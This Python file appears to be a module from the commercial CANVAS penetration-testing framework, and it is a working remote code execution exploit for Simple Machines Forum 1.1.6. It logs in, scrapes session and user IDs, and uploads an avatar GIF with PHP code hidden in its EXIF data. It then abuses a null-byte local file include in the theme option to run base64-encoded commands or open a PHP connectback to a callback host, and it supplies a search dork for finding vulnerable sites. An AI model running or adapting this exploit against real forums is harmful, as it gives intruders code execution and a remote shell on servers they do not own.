#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *

import libs.spkproxy as spkproxy
import canvasengine
import urllib
import re

NAME="Simple Machines Forum => 1.1.6 Remote Code Execution"
DESCRIPTION="Simple Machines Forum => 1.1.6 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Simplemachines.org"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION['NOTES']="No CVE entry for this, check: http://osvdb.org/show/osvdb/50072"
DOCUMENTATION["CVE Name"]="None"
DOCUMENTATION['CVE Url']="None"
DOCUMENTATION["References"]=["None"]
DOCUMENTATION["DORK"]=["Powered by SMF"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Local File Include in Themes.php in the update theme option.
To make this exploit reliable we upload an avatar with exif data in it 
and include the avatar and get php code execution. 

The exploit requires magic_quotes_gpc = Off in php.ini due to the use of 
a null byte in the attack.

"""

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.basepath="/"
        self.basepaths=["/smf116/","/forums/","/board/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.foundstrings=["Powered by SMF"]
        self.testfile="index.php"
	self.debug=0
	self.sid=""
	self.id=""
        return 
    
    def request1(self):
        self.log("[+] Logging In")
        data={}
        data["user"]=self.user
        self.log("[+] User: %s Password: %s"%(self.user, self.password))
        if self.version==1:
            self.log("[+] Using password (and blank hash_passwrd)")
            data["passwrd"]=self.password
            data["hash_passwrd"]=""
            
        else:
            self.log("[+] Using hash password")
            data["passwrd"]=""
            
        data["cookielength"]="-1"
        data=self.UA.POST("index.php?action=login2",data=data)
	if self.debug==1:
	    self.log("DEBUG: %s"%data)
        return True
    
    def request2(self):
        data=self.UA.GET("index.php?action=profile")
        if data.count("The user whose profile you are trying to view does not exist"):
            self.log("[-] Wrong Username/Password")
            return 0

        #get Session ID
        p=re.compile("sesc=([a-z0-9]{32})")
        match=p.search(data)
        if not match:
            self.log("[-] No session ID detected!")
            return 0
        self.sid=match.group()[-32:]
        self.log("[+] Sid found: %s"%self.sid)

        #Get user ID
        p=re.compile("u=(\d+);")
        match=p.search(data)
        if not match:
            self.log("[-] Error getting ID")
            return 0
        self.id=match.group()[2:].replace(";","")
        
        self.log("[+] ID Found: %s"%self.id)
        self.log("[+] Logged in")
	
	self.log("[+] Uploading avatar")
        fields={}
        fields["avatar_choice"]="upload"
        fields["sc"]=self.sid
        fields["userID"]=self.id
        fields["sa"]="forumProfile"
        files=[("attachment", "exploited.gif", self.shell)]
        self.UA.multipart("index.php?action=profile2", fields, files)
        
        return (self.sid,self.id)
    
    def request3(self):
	ret=""
	self.log("[+] Sending Exploit Data")
	
	data =self.UA.GET("index.php?action=jsoption;sesc=%s;th=32;var=theme_dir;val=./attachments/avatar_%s.gif%%2500"%(self.sid,self.id))
	    
	if self.command:
            self.log("[+] Command: %s"%self.command)

	    command=self.command
	    command=b64encode(command)
	    self.log("[+] Base64_encoded Command: %s"%command)
	    
	    data = self.UA.GET("index.php?action=theme;sa=pick;u=%s;sesc=%s&SERVER_INFO=%s"%(self.id,self.sid,urllib.quote_plus(command)))
                                           
            if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                self.log("Command result: %s"%prettyprint(result))
                ret=1
            else:
                self.log("[-] Command not run - service patched?!")
        else:
	    
	    command=self.get_php_to_mosdef()
	    self.log("[+] Command: %s"%command)			
	    command=b64encode(command)
	    self.log("[+] Base64_encoded Command: %s"%command)

	    data = self.UA.GET("index.php?action=theme;sa=pick;u=%s;sesc=%s&SERVER_INFO2=%s"%(self.id,self.sid,urllib.quote_plus(command)))
	   
            self.log("[+] Looking for PHP connectback")
	    
            ret=self.ISucceeded()
	
	return ret
	
    def usage(self):
	print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
	print "-t <target ip>"
	print "-p <target port>                [optional]"
	print "-O basepath: /path/to/smf/      [optional]"
	print "-O hostname: target vhost       [optional]"
	print "-O command:commandtorun         [optional]"
	print "-O user: forum username"
	print "-O password: forum password"
	print "-l call back ip if doing connect back"
	print "-d listening port for call back"
	return
	
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
